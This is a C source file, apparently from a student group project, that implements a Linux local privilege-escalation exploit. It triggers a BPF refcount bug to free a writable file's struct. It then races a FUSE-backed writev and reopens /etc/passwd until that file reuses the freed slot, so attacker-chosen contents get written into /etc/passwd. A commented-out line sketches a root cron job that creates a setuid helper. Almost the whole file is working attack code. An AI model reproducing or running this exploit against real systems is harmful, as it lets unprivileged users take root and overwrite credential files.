#define _GNU_SOURCE
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/bpf.h>
#include <stdio.h>
#include <linux/kcmp.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>

#ifndef __NR_bpf
# if defined(__i386__)
#  define __NR_bpf 357
# elif defined(__x86_64__)
#  define __NR_bpf 321
# elif defined(__aarch64__)
#  define __NR_bpf 280
# else
#  error
# endif
#endif

int map_fd;
char writeable[] = "/home/osboxes/GroupProject/tmp/write-only";
char readOnly[] = "/etc/passwd";

char* new_passwd;

int task(void* arg){

	char data[4096];
	sprintf(data, new_passwd);
	struct iovec iov = { .iov_base = data, .iov_len = strlen(data) };
	system("fusermount -u /home/user/GroupProject/fuse_mount 2>/dev/null; mkdir -p fuse_mount && ./fuse_op ./fuse_mount");
	int fuse_fd = open("fuse_mount/fuse_op", O_RDWR);
	if (fuse_fd == -1)
		err(1, "unable to open FUSE fd");
	write(fuse_fd, &iov, sizeof(iov)) != sizeof(iov);

	struct iovec *iov_ = mmap(NULL, sizeof(iov), PROT_READ, MAP_SHARED, fuse_fd, 0);
	fputs("starting writev\n", stderr);
	ssize_t writev_res = writev(map_fd, iov_, 1);

	if (writev_res == -1)
		err(1, "writev failed");
	if (writev_res != strlen(data))
		errx(1, "writev returned %d", (int)writev_res);
	fputs("writev wrote successfully. Program should end execution in a few seconds.\n", stderr);

}



//void write() {
//    char *cwd = get_current_dir_name();
//    char buffer[1024];
    // //etc/passwd file we could exploit instead?
    // sprintf(buffer, "* * * * * root /bin/chown root:root '%s'/suidhelper; /bin/chmod 06755 '%s'/suidhelper\n#", cwd, cwd);
//}

/* reduces the ref count by 1 per call to this function via the bpf exploit */
void bpf_reduce_refcnt(int fd) {
     struct bpf_insn insns[2] = {
        {
            .code = BPF_LD | BPF_IMM | BPF_DW,
            .src_reg = BPF_PSEUDO_MAP_FD,
            .imm = fd
        },
        {}
    };
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = 2,
        .insns = (__aligned_u64) insns,
        .license = (__aligned_u64)""
    };
    int syscallRet = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    if (syscallRet != -1) {
        printf("Successfully returned? This shouldn't happen;\
         the call should be invalid, but in a specific way");
    }
    if (errno != EINVAL) {
        printf("Wrong type of invalid bpf program. Got a\
         different error from the one we are trying to exploit");
    }
}

/**
    file A should be  writeable,
    file B should readable
    use file A's writeability & exploit to write to file B
*/
void exploit(char writeable[], char readOnly[]) {
    printf("%s\n", writeable);
    // step 1. open the writeable file
    map_fd =  open(writeable, O_WRONLY | O_CLOEXEC);
    char child_stack[1000];
    int child = clone(task, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);
    sleep(5);
    /*
        O_CLOEXEC (since Linux 2.6.23)
        Enable the close-on-exec flag for the new file descriptor.
        Specifying this flag permits a program to avoid additional
        fcntl(2) F_SETFD operations to set the FD_CLOEXEC flag.
        http://man7.org/linux/man-pages/man2/open.2.html

        Note that the use of this flag is essential in some
              multithreaded programs, because using a separate fcntl(2)
              F_SETFD operation to set the FD_CLOEXEC flag does not suffice
              to avoid race conditions where one thread opens a file
              descriptor and attempts to set its close-on-exec flag using
              fcntl(2) at the same time as another thread does a fork(2)
              plus execve(2).
        -- helps avoid race conditions

    */

    //the referenc needs to be freed twice
    bpf_reduce_refcnt(map_fd);
    bpf_reduce_refcnt(map_fd);

    int new_fd;
    //open the file we want to write to continuosly until the file is loaded in the same memory as the old fd
    while(1){
        new_fd = open(readOnly, O_RDONLY);
        if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, map_fd, new_fd) == 0) break;
    }
    fputs("Found the pointer\n", stdout);
    waitpid(child,0,0);
}

int main(void) {
    int fd = open("./tmp/passwd", O_RDONLY);
    int len = lseek(fd, 0, SEEK_END);
    new_passwd = mmap(0, len, PROT_READ, MAP_PRIVATE, fd, 0);
    //printf("%s", new_passwd);
    exploit(writeable, readOnly);
    // map_fd = open("readonly", O_RDONLY);
    // char child_stack[20000];
	// int child = clone(task, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);

    // struct bpf_insn insns[2] = {
    // {
    //     .code = BPF_LD | BPF_IMM | BPF_DW,
    //     .src_reg = BPF_PSEUDO_MAP_FD,
    //     .imm = map_fd
    // },
    // {
    // }
    // };
    // union bpf_attr attr = {
    //     .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    //     .insn_cnt = 2,
    //     .insns = (__aligned_u64) insns,
    //     .license = (__aligned_u64)""
    // };
    // syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    // int dummy_fd = open("writeonly", O_WRONLY);
    // const void *buf[10];
    // read(map_fd, buf, 1);
}
